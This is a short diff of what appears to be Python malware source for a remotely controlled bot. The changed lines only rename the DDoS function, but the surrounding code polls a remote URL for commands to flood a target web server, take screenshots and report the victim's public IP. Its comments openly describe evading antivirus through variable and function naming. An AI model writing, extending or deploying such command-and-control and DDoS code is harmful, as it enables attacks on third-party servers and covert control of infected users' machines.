@@ -63,11 +63,11 @@ def main():
         # calling the variable signal seems to not trigger av, but it really should be command
         signal = get_web_content(URL, "1")
 
-        if (signal == "1"): # ddos_target()
+        if (signal == "1"): # ddos_target_web_server()
             target = get_web_content(URL, "2")
             stop_time = get_web_content(URL, "3")
 
-            ddos_target(target, stop_time)
+            ddos_target_web_server(target, stop_time)
         elif (signal == "2"): # take_screenshot()
             take_screenshot(win_user)
         elif (signal == "3"): # get_pub_ip_address()
@@ -154,8 +154,8 @@ def download_file(filename):
 
 
 ###---COMMAND MODULES---###
-# NOTE: change back to im_living when done (evades antivirus)
-def ddos_target(target, stop_time): # 1
+# NOTE: change back to im_living when done (to evade anti-virus)
+def ddos_target_web_server(target, stop_time): # 1
     source = str(socket.gethostbyname(socket.gethostname()))
     destination_port = 80
 
